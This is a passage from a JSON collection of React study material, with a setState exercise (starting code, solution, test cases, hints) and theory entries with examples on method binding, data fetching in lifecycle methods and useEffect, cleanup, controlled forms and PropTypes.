          "startingCode": "import React, { Component } from 'react';\n\nclass AsyncCounter extends Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n  }\n\n  handleSyncClick = () => {\n    // Task 3: Log before guaranteed update\n    this.setState({ count: this.state.count + 1 });\n    console.log('Sync Click - After 1st setState (before update):', this.state.count);\n\n    // Task 4: Functional setState with callback\n    // TODO: Implement functional setState here\n    // TODO: Add a callback to log the final updated count\n  };\n\n  incrementTwiceAsync = () => {\n    // Task 5: Simulate batched async updates\n    setTimeout(() => {\n      // TODO: Use functional setState twice here\n      console.log('Async Update Complete:', this.state.count);\n    }, 0);\n  };\n\n  render() {\n    return (\n      <div>\n        <h1>Async setState Demo</h1>\n        <p>Count: {this.state.count}</p>\n        <button onClick={this.handleSyncClick}>Increment Sync (x2)</button>\n        <button onClick={this.incrementTwiceAsync}>Increment Async (x2)</button>\n      </div>\n    );\n  }\n}\n\nexport default AsyncCounter;\n",
          "solutionCode": "import React, { Component } from 'react';\n\nclass AsyncCounter extends Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n  }\n\n  handleSyncClick = () => {\n    // First setState: demonstrates asynchronous nature\n    this.setState({ count: this.state.count + 1 });\n    console.log('Sync Click - After 1st setState (before update):', this.state.count);\n\n    // Second setState: functional form with callback for guaranteed update\n    this.setState((prevState) => ({\n      count: prevState.count + 1\n    }), () => {\n      console.log('Sync Click - After 2nd setState (callback):', this.state.count);\n      console.log('--- Sync Click batch complete ---');\n    });\n  };\n\n  incrementTwiceAsync = () => {\n    setTimeout(() => {\n      // Using functional setState in an asynchronous context (like setTimeout)\n      // ensures correct updates even when React's internal batching is bypassed.\n      this.setState(prevState => ({ count: prevState.count + 1 }));\n      this.setState(prevState => ({ count: prevState.count + 1 }));\n      console.log('Async Update Complete (via setTimeout):', this.state.count);\n      console.log('--- Async Click batch complete ---');\n    }, 0);\n  };\n\n  render() {\n    return (\n      <div>\n        <h1>Async setState Demo</h1>\n        <p>Count: {this.state.count}</p>\n        <button onClick={this.handleSyncClick}>Increment Sync (x2)</button>\n        <button onClick={this.incrementTwiceAsync}>Increment Async (x2)</button>\n      </div>\n    );\n  }\n}\n\nexport default AsyncCounter;\n",
          "testCases": [
            "Initial render: Count should be 0.",
            "Click 'Increment Sync (x2)':\n  - The first `console.log` should output 0 (stale state).\n  - The `console.log` inside the callback should output 2 (correct final state).\n  - The displayed count in the UI should become 2.",
            "Click 'Increment Async (x2)':\n  - After a slight delay, the `console.log` should output the correct incremented count (e.g., if starting at 2, it should output 4).",
            "Multiple clicks on either button should consistently increment the counter correctly."
          ],
          "hints": [
            "Remember that `setState` calls within React's event handlers are often batched.",
            "To get the *latest* state after an update within the same tick, use the `setState` callback function.",
            "When the new state depends on the previous state, always use the functional form of `setState` (`(prevState, props) => ({ ... })`).",
            "Even when `setState` is called in an asynchronous context (like `setTimeout`), the functional form ensures reliability because `prevState` is guaranteed to be the most recent state at the time of the update."
          ],
          "tags": [
            "React",
            "setState",
            "Asynchronous",
            "State Management",
            "Class Components",
            "Best Practices"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "React_State",
            "JavaScript_Asynchronous"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "theory_react_fundamentals",
            "question_react_setstate_async",
            "question_react_setstate_functional_use_case_code"
          ]
        }
      ]
    }
  },
  {
    "id": "f1e636d4-59e1-42c6-8b6c-85e3bafe5480",
    "startLine": 13500,
    "endLine": 13599,
    "processedDate": "2025-06-17T13:29:16.284Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_class_method_binding",
          "title": "Class Method Binding in React",
          "content": "In React class components, the `this` keyword inside a method does not automatically refer to the component instance when the method is passed as an event handler (e.g., to an `onClick` prop). This is because JavaScript's `this` context depends on how the function is called, not where it's defined. When a class method is called as an event handler, `this` typically becomes `undefined` in strict mode (which React uses internally), leading to errors like `TypeError: Cannot read property 'setState' of undefined`.\n\nTo ensure `this` correctly refers to the component instance within class methods, binding is necessary. There are several common approaches:\n\n## Binding Approaches\n\n1.  **Binding in the Constructor:** This is a traditional and widely accepted method. Binding once in the constructor ensures that the method's `this` context is permanently bound to the component instance for all future calls. It's performant as the binding only happens once when the component is created.\n2.  **Using Arrow Functions as Class Properties (Class Fields Syntax):** This modern syntax leverages ES6 arrow functions, which lexically bind `this`. This means the `this` inside an arrow function automatically refers to the `this` of the enclosing context (the class instance). This approach is often preferred for its cleaner syntax and automatic binding, eliminating the need for explicit constructor binding. It requires transpilation (e.g., with Babel).\n3.  **Arrow Function in the `render` Method (Inline Binding):** This approach involves defining an arrow function directly within the `render` method and calling the class method inside it. While seemingly convenient, this method creates a *new function* on every render. If the component re-renders frequently, this can lead to performance issues as React's reconciliation process might see a new function prop each time, potentially causing re-renders of child components that receive this function as a prop, even if their state hasn't fundamentally changed. This method is generally discouraged for performance-critical scenarios or when passing the function down to child components as props, but can be acceptable for very simple, isolated cases.\n\n## Why Binding is Important\n\n*   **Correct `this` context:** Ensures `this` inside your event handlers correctly points to the component instance, allowing access to `this.state`, `this.props`, and `this.setState()`.\n*   **Preventing Errors:** Avoids `TypeError` due to `this` being `undefined`.\n*   **Maintaining Component State:** Allows methods to interact with and update the component's internal state reliably.",
          "examples": [
            {
              "id": "example_class_method_binding_1",
              "title": "Option 1: Bind in Constructor",
              "code": "class MyComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n    // Bind 'this' to handleClick once in the constructor\n    this.handleClick = this.handleClick.bind(this);\n  }\n\n  handleClick() {\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  }\n\n  render() {\n    return (\n      <button onClick={this.handleClick}>\n        Clicked {this.state.count} times\n      </button>\n    );\n  }\n}",
              "explanation": "In this example, `this.handleClick` is explicitly bound to the component instance (`this`) inside the constructor. This ensures that whenever `handleClick` is invoked as an event listener, its `this` context will correctly refer to `MyComponent`'s instance. This is efficient as the binding happens only once.",
              "language": "javascript"
            },
            {
              "id": "example_class_method_binding_2",
              "title": "Option 2: Use Arrow Functions for Class Methods (Class Fields)",
              "code": "class MyComponent extends React.Component {\n  state = { count: 0 };\n\n  // Use an arrow function as a class property\n  handleClick = () => {\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  }\n\n  render() {\n    return (\n      <button onClick={this.handleClick}>\n        Clicked {this.state.count} times\n      </button>\n    );\n  }\n}",
              "explanation": "Here, `handleClick` is defined as a class property using an arrow function. Arrow functions automatically bind `this` to the lexical scope in which they are defined. In this case, `this` inside `handleClick` will always refer to the `MyComponent` instance, eliminating the need for explicit binding in the constructor. This is a popular and concise approach.",
              "language": "javascript"
            },
            {
              "id": "example_class_method_binding_3",
              "title": "Option 3: Arrow Function in Render (Inline Binding)",
              "code": "class MyComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n  }\n\n  handleClick() {\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  }\n\n  render() {\n    return (\n      // A new function is created on every render\n      <button onClick={() => this.handleClick()}>\n        Clicked {this.state.count} times\n      </button>\n    );\n  }\n}",
              "explanation": "This approach defines a new arrow function `() => this.handleClick()` directly within the `render` method. While it works, a new function instance is created on *every* re-render of `MyComponent`. If this component re-renders frequently or passes this function down to optimized child components (e.g., PureComponent or `memo`), it can negatively impact performance due to unnecessary re-renders of children. It's generally less preferred than the first two options.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_class_method_binding_1",
            "question_class_method_binding_2",
            "question_class_method_binding_3",
            "question_class_method_binding_4",
            "question_class_method_binding_5"
          ],
          "relatedTasks": [
            "task_class_method_binding_1"
          ],
          "tags": [
            "React",
            "Class Components",
            "ES6",
            "Binding",
            "this context",
            "Performance"
          ],
          "technology": "React",
          "prerequisites": [
            "javascript_this_keyword",
            "javascript_arrow_functions",
            "react_class_components",
            "react_state"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "react_event_handling",
            "react_performance_optimization"
          ]
        },
        {
          "id": "theory_api_calls_lifecycle",
          "title": "Making API Calls in React Lifecycle",
          "content": "Making network requests (API calls) is a common operation in React applications to fetch data from a server. The timing of these calls is crucial to ensure data is available when needed without causing errors or performance issues.\n\n## Class Components: `componentDidMount()`\n\nThe recommended lifecycle method for making API calls in React class components is `componentDidMount()`. Here's why:\n\n*   **Runs Once After Initial Render:** `componentDidMount()` is invoked immediately after a component is mounted (inserted into the DOM) for the first time. This ensures that the component's DOM elements are available if needed for the API call or subsequent rendering based on the fetched data.\n*   **Safe to Use `setState()`:** At this point, the component is fully mounted, so calling `this.setState()` inside `componentDidMount()` will trigger a re-render with the fetched data without causing an infinite loop. Calling `setState` in `render` would cause an infinite loop, and in the `constructor` state should only be initialized, not updated based on async operations.\n*   **Recommended Practice:** React documentation explicitly recommends `componentDidMount()` for data fetching.\n\n## Functional Components: `useEffect()`\n\nFor functional components, the `useEffect` hook is the equivalent and preferred way to perform side effects, including data fetching. To mimic `componentDidMount` behavior (running only once after initial render), `useEffect` should be used with an empty dependency array (`[]`).\n\n*   **Empty Dependency Array:** When `useEffect` has an empty dependency array, it tells React to run the effect only once after the initial render and clean it up (if a cleanup function is returned) when the component unmounts.\n*   **Asynchronous Nature:** Inside `useEffect`, you should typically define and immediately call an `async` function (or use `.then()`/`.catch()`) to handle the asynchronous API call.\n\n## Why not other lifecycle methods?\n\n*   **`constructor`:** Only for initial state setup and binding. Side effects are not allowed.\n*   **`render()`:** Calling `setState` here leads to an infinite loop because `setState` triggers a re-render, which calls `render` again.\n*   **`componentDidUpdate()`:** While `componentDidUpdate` can be used for data fetching, it runs on *every* update. If used for initial fetching, it would need careful conditional checks to prevent re-fetching on every state/prop change, which is more complex than `componentDidMount`.\n*   **`componentWillMount()` (Deprecated):** This method was deprecated due to potential issues with asynchronous calls and inconsistent behavior when server-side rendering is involved. It's best avoided.",
          "examples": [
            {
              "id": "example_api_call_class",
              "title": "API Call in Class Component (`componentDidMount`)",
              "code": "import React from 'react';\n\nclass DataFetcher extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { data: null, loading: true, error: null };\n  }\n\n  componentDidMount() {\n    // This method runs once after the component mounts\n    fetch('https://jsonplaceholder.typicode.com/todos/1')\n      .then(response => {\n        if (!response.ok) {\n          throw new Error('Network response was not ok');\n        }\n        return response.json();\n      })\n      .then(data => {\n        this.setState({ data, loading: false });\n      })\n      .catch(error => {\n        this.setState({ error, loading: false });\n      });\n  }\n\n  render() {\n    const { data, loading, error } = this.state;\n\n    if (loading) return <div>Loading data...</div>;\n    if (error) return <div>Error: {error.message}</div>;\n\n    return (\n      <div>\n        <h2>Fetched Data:</h2>\n        <p>Title: {data.title}</p>\n        <p>Completed: {data.completed ? 'Yes' : 'No'}</p>\n      </div>\n    );\n  }\n}",
              "explanation": "This class component fetches data from a public API when it first mounts. The `fetch` call is placed inside `componentDidMount`, and `setState` is used to update the component's state with the fetched data or any errors. This ensures the component is ready before fetching, and the state updates safely trigger re-renders.",
              "language": "javascript"
            },
            {
              "id": "example_api_call_functional",
              "title": "API Call in Functional Component (`useEffect`)",
              "code": "import React, { useState, useEffect } from 'react';\n\nfunction DataFetcherHook() {\n  const [data, setData] = useState(null);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n\n  useEffect(() => {\n    // Define an async function inside useEffect\n    const fetchData = async () => {\n      try {\n        const response = await fetch('https://jsonplaceholder.typicode.com/todos/1');\n        if (!response.ok) {\n          throw new Error('Network response was not ok');\n        }\n        const result = await response.json();\n        setData(result);\n      } catch (err) {\n        setError(err);\n      } finally {\n        setLoading(false);\n      }\n    };\n\n    fetchData(); // Call the async function\n\n    // Empty dependency array ensures this effect runs only once after initial render\n  }, []); \n\n  if (loading) return <div>Loading data...</div>;\n  if (error) return <div>Error: {error.message}</div>;\n\n  return (\n    <div>\n      <h2>Fetched Data:</h2>\n      <p>Title: {data.title}</p>\n      <p>Completed: {data.completed ? 'Yes' : 'No'}</p>\n    </div>\n  );\n}",
              "explanation": "This functional component uses the `useEffect` hook to fetch data. The `fetchData` async function is defined inside `useEffect` and immediately called. The empty dependency array `[]` ensures that this effect runs only once, similar to `componentDidMount` in class components. State is managed using `useState` hooks.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_api_calls_lifecycle_1",
            "question_api_calls_lifecycle_2",
            "question_api_calls_lifecycle_3",
            "question_api_calls_lifecycle_4"
          ],
          "relatedTasks": [
            "task_api_calls_lifecycle_1"
          ],
          "tags": [
            "React",
            "Lifecycle Methods",
            "Hooks",
            "API Calls",
            "Data Fetching",
            "componentDidMount",
            "useEffect"
          ],
          "technology": "React",
          "prerequisites": [
            "react_class_components",
            "react_functional_components",
            "react_hooks",
            "javascript_promises",
            "javascript_async_await"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "react_state_management",
            "react_data_flow"
          ]
        },
        {
          "id": "theory_setState_in_render",
          "title": "Consequences of Calling `setState()` in the `render` Method",
          "content": "Calling `setState()` directly within the `render` method of a React component is a critical anti-pattern and will inevitably lead to an infinite loop, causing your application to crash or become unresponsive. This is a fundamental concept related to React's rendering lifecycle.\n\n## The Infinite Loop Mechanism\n\n1.  **`setState()` is called:** When `setState()` is invoked, it schedules an update to the component's state.\n2.  **State Update Triggers Re-render:** React detects the state change and initiates a re-render of the component.\n3.  **`render()` Method is Executed:** As part of the re-render cycle, the component's `render()` method is called again.\n4.  **`setState()` is Called Again:** Inside this re-executed `render()` method, `setState()` is encountered and called *again*.\n5.  **Cycle Repeats:** This immediately triggers another re-render, leading back to step 1, creating an unending cycle of updates and renders.\n\nThis continuous loop consumes excessive CPU and memory, quickly overwhelming the browser and leading to a stack overflow error or a frozen tab.\n\n## Why `render` Should Be Pure\n\nThe `render` method in React components is expected to be a **pure function**. A pure function:\n\n*   Given the same inputs (props and state), always returns the same output (JSX).\n*   Has no side effects. This means it should not modify component state, directly interact with the DOM (outside of returning JSX), perform network requests, or change external variables.\n\nModifying state inside `render` violates this purity principle by introducing a side effect that directly interferes with the rendering process itself.",
          "examples": [
            {
              "id": "example_setState_in_render_bad",
              "title": "BAD PRACTICE: Calling setState in render (Causes Infinite Loop)",
              "code": "import React from 'react';\n\nclass InfiniteLoopComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n  }\n\n  render() {\n    // DO NOT DO THIS! This will cause an infinite loop.\n    // this.setState({ count: this.state.count + 1 }); \n\n    // If uncommented, this component will crash your browser.\n    // The logic inside render must be pure and not cause side effects.\n\n    console.log('Rendering...');\n    return (\n      <div>\n        <h1>Count: {this.state.count}</h1>\n        <p>This component would crash if setState was called directly in render.</p>\n      </div>\n    );\n  }\n}",
              "explanation": "This example shows the conceptual location where `setState` *should not* be called. If the commented line `this.setState({ count: this.state.count + 1 });` were uncommented, every time `render()` is called, it would immediately trigger another `setState()`, leading to an infinite loop and browser crash. The `render` method must be pure and declarative, only returning JSX based on current props and state, without altering them.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_setState_in_render_1",
            "question_setState_in_render_2",
            "question_setState_in_render_3"
          ],
          "relatedTasks": [
            "task_setState_in_render_1"
          ],
          "tags": [
            "React",
            "Lifecycle Methods",
            "State Management",
            "Performance",
            "Anti-patterns",
            "Infinite Loop"
          ],
          "technology": "React",
          "prerequisites": [
            "react_class_components",
            "react_state",
            "react_lifecycle"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "react_debugging",
            "react_performance_optimization"
          ]
        },
        {
          "id": "theory_componentWillUnmount",
          "title": "Purpose of `componentWillUnmount()` in React",
          "content": "`componentWillUnmount()` is a lifecycle method in React class components that is invoked immediately before a component is unmounted and destroyed (removed from the DOM). It is the ideal place to perform any necessary cleanup associated with the component to prevent memory leaks and ensure your application remains stable.\n\n## Common Cleanup Operations\n\n*   **Removing Event Listeners:** If you added event listeners (e.g., `window.addEventListener`, `document.addEventListener`) in `componentDidMount`, you must remove them in `componentWillUnmount`. Failing to do so can lead to listeners still referencing the unmounted component, causing memory leaks and potential errors if the callback tries to interact with a non-existent component.\n*   **Cancelling Network Requests:** For ongoing `fetch` or `axios` requests, you should cancel them if the component unmounts before the request completes. This prevents `setState` calls on an unmounted component, which React warns about and can lead to bugs. Modern APIs like `AbortController` or library-specific cancellation tokens are useful here.\n*   **Cleaning Up Subscriptions:** If your component subscribes to external data sources (e.g., WebSockets, Redux store, custom observable patterns), `componentWillUnmount` is where you should unsubscribe to prevent memory leaks and ensure the component doesn't receive updates after it's gone.\n*   **Invalidating Timers:** Any `setTimeout` or `setInterval` timers started in `componentDidMount` or other methods should be cleared (`clearTimeout`, `clearInterval`) in `componentWillUnmount` to prevent them from firing after the component is removed.\n*   **Resetting Global State/DOM Changes:** If your component made global changes (e.g., manipulating `document.title`, adding/removing CSS classes to `<body>`), `componentWillUnmount` is the place to revert those changes.\n\n## Functional Components Equivalent: `useEffect` Cleanup\n\nIn functional components, the cleanup logic typically found in `componentWillUnmount` is handled by the return function of the `useEffect` hook. If `useEffect` returns a function, React will execute that function right before the component unmounts, or before the effect re-runs if its dependencies change.\n\nThis ensures that resources are properly released, and the application remains efficient and free of unintended side effects.",
          "examples": [
            {
              "id": "example_componentWillUnmount_class",
              "title": "Cleanup in Class Component (`componentWillUnmount`)",
              "code": "import React from 'react';\n\nclass TimerComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { seconds: 0 };\n    this.timerId = null;\n  }\n\n  componentDidMount() {\n    // Start a timer when the component mounts\n    this.timerId = setInterval(() => {\n      this.setState(prevState => ({ seconds: prevState.seconds + 1 }));\n    }, 1000);\n    console.log('Timer started');\n  }\n\n  componentWillUnmount() {\n    // Clear the timer when the component unmounts to prevent memory leaks\n    clearInterval(this.timerId);\n    console.log('Timer cleared');\n  }\n\n  render() {\n    return (\n      <div>\n        <h2>Timer: {this.state.seconds} seconds</h2>\n        <p>Open console to see lifecycle logs.</p>\n      </div>\n    );\n  }\n}",
              "explanation": "This component starts a timer in `componentDidMount` to update its state every second. Crucially, in `componentWillUnmount`, it clears the `setInterval` using `clearInterval`. If this cleanup wasn't done, the timer would continue to run even after the `TimerComponent` is removed from the DOM, potentially attempting to `setState` on an unmounted component and leading to errors and memory leaks.",
              "language": "javascript"
            },
            {
              "id": "example_componentWillUnmount_functional",
              "title": "Cleanup in Functional Component (`useEffect` return)",
              "code": "import React, { useState, useEffect } from 'react';\n\nfunction TimerHookComponent() {\n  const [seconds, setSeconds] = useState(0);\n\n  useEffect(() => {\n    // Effect runs once on mount (empty dependency array)\n    const intervalId = setInterval(() => {\n      setSeconds(prevSeconds => prevSeconds + 1);\n    }, 1000);\n    console.log('Timer started');\n\n    // This return function is the cleanup phase, runs on unmount or re-render\n    return () => {\n      clearInterval(intervalId);\n      console.log('Timer cleared');\n    };\n  }, []); // Empty dependency array means effect runs once, cleanup runs once on unmount\n\n  return (\n    <div>\n      <h2>Timer: {seconds} seconds</h2>\n      <p>Open console to see lifecycle logs.</p>\n    </div>\n  );\n}",
              "explanation": "In functional components, the cleanup logic is part of `useEffect`. The function returned by `useEffect` is executed when the component unmounts or before the effect re-runs (if dependencies change). Here, `clearInterval` is called in the cleanup function, ensuring the timer is stopped when the component is removed from the DOM, preventing leaks.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_componentWillUnmount_1",
            "question_componentWillUnmount_2",
            "question_componentWillUnmount_3",
            "question_componentWillUnmount_4"
          ],
          "relatedTasks": [
            "task_componentWillUnmount_1"
          ],
          "tags": [
            "React",
            "Lifecycle Methods",
            "Hooks",
            "Cleanup",
            "Memory Leaks",
            "componentWillUnmount",
            "useEffect"
          ],
          "technology": "React",
          "prerequisites": [
            "react_class_components",
            "react_functional_components",
            "react_hooks"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "react_performance_optimization",
            "react_robust_applications"
          ]
        },
        {
          "id": "theory_controlled_uncontrolled_components",
          "title": "Controlled vs. Uncontrolled Components in React Forms",
          "content": "When dealing with form elements (like `input`, `textarea`, `select`) in React, there are two primary approaches to managing their data and user input: controlled components and uncontrolled components. The choice depends on the level of control and complexity required.\n\n## Controlled Components\n\n*   **Definition:** A controlled component is a form input element whose value is controlled by React state. The state acts as the \"single source of truth\" for the input's value.\n*   **Mechanism:**\n    *   You pass the component's state variable as the `value` prop to the input element.\n    *   You attach an `onChange` event handler to the input. This handler updates the React state with the input's new value (typically from `event.target.value`).\n    *   React re-renders the input with the updated state, making the input's display value always reflect the state.\n*   **Advantages:**\n    *   **Predictable Data Flow:** Input values are always tied to state, making it easy to validate, modify, or format input as the user types.\n    *   **Instant Feedback:** Ideal for inputs that need real-time validation, character limits, or dynamic enabling/disabling of buttons.\n    *   **Centralized Control:** Simplifies form submission, as all input values are readily available in the component's state.\n*   **Disadvantages:**\n    *   **More Boilerplate:** Requires writing `value` and `onChange` for every controlled input.\n    *   **Performance for Many Inputs:** Can lead to minor performance overhead for very large forms with many frequently updated inputs, as each keypress triggers a state update and re-render.\n\n## Uncontrolled Components\n\n*   **Definition:** An uncontrolled component is a form input element that maintains its own internal state (like a traditional HTML input). React does not control its value directly.\n*   **Mechanism:**\n    *   You typically use a `ref` to access the DOM element directly.\n    *   When you need the input's value (e.g., on form submission), you read it directly from the DOM using the ref (e.g., `myRef.current.value`).\n*   **Advantages:**\n    *   **Less Boilerplate:** No need for `onChange` handlers or explicit state management for each input.\n    *   **Simpler for Simple Forms:** Good for forms where you only need the value once (e.g., on submit) and don't require real-time validation or manipulation.\n    *   **Potentially Better Performance:** No re-renders on every keystroke, as React isn't managing its value.\n*   **Disadvantages:**\n    *   **Less Control:** Difficult to implement real-time input validation, formatting, or dynamic UI changes based on input.\n    *   **Harder to Debug:** Debugging can be more challenging as the source of truth is the DOM, not React state.\n    *   **Mixed Paradigms:** Blends React's declarative nature with imperative DOM manipulation.\n\n## When to Choose Which\n\n*   **Controlled Components:** Recommended for most cases, especially when you need dynamic, interactive forms with validation, conditional logic, or when data needs to be pre-filled or manipulated programmatically.\n*   **Uncontrolled Components:** Consider for simple forms where you just need to get the final value on submission, or for integrating with non-React code that expects to manage its own DOM elements.",
          "examples": [
            {
              "id": "example_controlled_component",
              "title": "Controlled Component Example",
              "code": "import React, { useState } from 'react';\n\nfunction ControlledForm() {\n  const [name, setName] = useState('');\n  const [email, setEmail] = useState('');\n\n  const handleSubmit = (event) => {\n    event.preventDefault();\n    alert(`Name: ${name}, Email: ${email}`);\n    console.log({ name, email });\n  };\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <label>\n        Name:\n        <input\n          type=\"text\"\n          value={name} // Value is controlled by React state\n          onChange={(e) => setName(e.target.value)} // State updates on change\n        />\n      </label>\n      <br />\n      <label>\n        Email:\n        <input\n          type=\"email\"\n          value={email}\n          onChange={(e) => setEmail(e.target.value)}\n        />\n      </label>\n      <br />\n      <button type=\"submit\">Submit</button>\n      <p>Current Name: {name}</p>\n    </form>\n  );\n}",
              "explanation": "In this example, both the `name` and `email` input fields are controlled. Their `value` props are bound to state variables (`name`, `email`), and their `onChange` handlers update those state variables. This means React's state is the single source of truth for the input values, allowing for immediate display of current value and easy access for submission or validation.",
              "language": "javascript"
            },
            {
              "id": "example_uncontrolled_component",
              "title": "Uncontrolled Component Example",
              "code": "import React, { useRef } from 'react';\n\nfunction UncontrolledForm() {\n  const nameInputRef = useRef(null);\n  const emailInputRef = useRef(null);\n\n  const handleSubmit = (event) => {\n    event.preventDefault();\n    // Access input values directly via refs on submission\n    const name = nameInputRef.current.value;\n    const email = emailInputRef.current.value;\n    alert(`Name: ${name}, Email: ${email}`);\n    console.log({ name, email });\n  };\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <label>\n        Name:\n        <input\n          type=\"text\"\n          defaultValue=\"John Doe\" // Optional initial value\n          ref={nameInputRef} // Attach ref to access DOM element\n        />\n      </label>\n      <br />\n      <label>\n        Email:\n        <input\n          type=\"email\"\n          ref={emailInputRef}\n        />\n      </label>\n      <br />\n      <button type=\"submit\">Submit</button>\n    </form>\n  );\n}",
              "explanation": "Here, `name` and `email` inputs are uncontrolled. They manage their own internal state. We use `useRef` to create references that attach to the DOM input elements. When the form is submitted, we access `nameInputRef.current.value` and `emailInputRef.current.value` directly to retrieve the current input values. `defaultValue` is used for providing an initial value, unlike `value` in controlled components.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_controlled_uncontrolled_components_1",
            "question_controlled_uncontrolled_components_2",
            "question_controlled_uncontrolled_components_3",
            "question_controlled_uncontrolled_components_4"
          ],
          "relatedTasks": [
            "task_controlled_uncontrolled_components_1"
          ],
          "tags": [
            "React",
            "Forms",
            "State Management",
            "Refs",
            "Controlled Components",
            "Uncontrolled Components"
          ],
          "technology": "React",
          "prerequisites": [
            "react_state",
            "react_props",
            "react_refs"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "react_forms_handling",
            "react_user_input"
          ]
        },
        {
          "id": "theory_propTypes",
          "title": "Understanding PropTypes in React",
          "content": "PropTypes are a mechanism in React for type-checking the props passed to components. They serve as a form of runtime validation and documentation, helping developers catch bugs early in the development process by generating warnings if incorrect types of props are provided.\n\n## Purpose and Usefulness\n\n*   **Documentation:** PropTypes explicitly define the expected types, shapes, and requiredness of a component's props. This makes components easier to understand and use for other developers (or your future self).\n*   **Runtime Validation:** During development, if a component receives a prop that doesn't match its specified `PropTypes`, React will issue a warning in the console. This helps identify and fix prop-related errors quickly.\n*   **Debugging Aid:** Warnings about incorrect prop types can point directly to issues where data is being passed incorrectly or component assumptions are violated.\n*   **Development-Only:** PropTypes are automatically stripped out in production builds through tools like Webpack or Rollup (using `process.env.NODE_ENV === 'production'` checks), so they don't add overhead to your production application's performance.\n\n## How to Use PropTypes\n\nPropTypes are imported from the `prop-types` package. You define them as a static property `propTypes` on your component class or functional component.\n\n## Common PropType Validations\n\n*   `PropTypes.any`: Any data type.\n*   `PropTypes.array`: An array.\n*   `PropTypes.bool`: A boolean.\n*   `PropTypes.func`: A function.\n*   `PropTypes.number`: A number.\n*   `PropTypes.object`: An object.\n*   `PropTypes.string`: A string.\n*   `PropTypes.symbol`: A symbol.\n*   `PropTypes.node`: Anything that can be rendered (numbers, strings, elements, arrays, fragments).\n*   `PropTypes.element`: A React element.\n*   `PropTypes.instanceOf(MyClass)`: An instance of a specific class.\n*   `PropTypes.oneOf(['option1', 'option2'])`: Value must be one of a given list.\n*   `PropTypes.arrayOf(PropTypes.number)`: An array of numbers.\n*   `PropTypes.objectOf(PropTypes.number)`: An object with property values of a certain type.\n*   `PropTypes.shape({ color: PropTypes.string, fontSize: PropTypes.number })`: An object with a specific shape.\n*   `PropTypes.exact({ color: PropTypes.string, fontSize: PropTypes.number })`: An object with a specific shape and no additional properties.\n*   `propType.isRequired`: Appends to any of the above to make the prop mandatory.\n\n## Alternatives to PropTypes\n\nWhile PropTypes are useful, for more robust and compile-time type checking, many modern React projects opt for static type checkers:\n\n*   **TypeScript:** The most popular choice, providing static typing across your entire JavaScript codebase. It offers excellent tooling, autocompletion, and catches type errors before runtime.\n*   **Flow:** Facebook's own static type checker, similar to TypeScript. While less widely adopted than TypeScript, it provides similar benefits for type safety.",
          "examples": [
            {
              "id": "example_propTypes_basic",
              "title": "Basic PropTypes Usage",
              "code": "import React from 'react';\nimport PropTypes from 'prop-types';\n\nfunction Greeting(props) {\n  return (\n    <div>\n      <h1>Hello, {props.name}!</h1>\n      {props.age && <p>You are {props.age} years old.</p>}\n      <p>Is Admin: {props.isAdmin ? 'Yes' : 'No'}</p>\n      <button onClick={props.onGreet}>Greet Me</button>\n    </div>\n  );\n}\n\n// Define propTypes for the Greeting component\nGreeting.propTypes = {\n  name: PropTypes.string.isRequired, // 'name' must be a string and is required\n  age: PropTypes.number,             // 'age' is an optional number\n  isAdmin: PropTypes.bool.isRequired, // 'isAdmin' must be a boolean and is required\n  onGreet: PropTypes.func.isRequired // 'onGreet' must be a function and is required\n};\n\n// Example of usage (assuming rendered elsewhere):\n// <Greeting name=\"Alice\" age={30} isAdmin={true} onGreet={() => console.log('Hi!')} />\n// <Greeting name={123} isAdmin=\"false\" /> // This would cause console warnings\n",
              "explanation": "This example shows how to define `propTypes` for a functional component. `Greeting.propTypes` is an object where keys are prop names and values are `PropTypes` validators. `isRequired` makes a prop mandatory. If `Greeting` receives a non-string `name` or missing `isAdmin` (in development mode), a warning will appear in the browser console, guiding the developer to fix the prop types.",
              "language": "javascript"
            },
            {
              "id": "example_propTypes_complex",
              "title": "Complex PropTypes: Shape and ArrayOf",
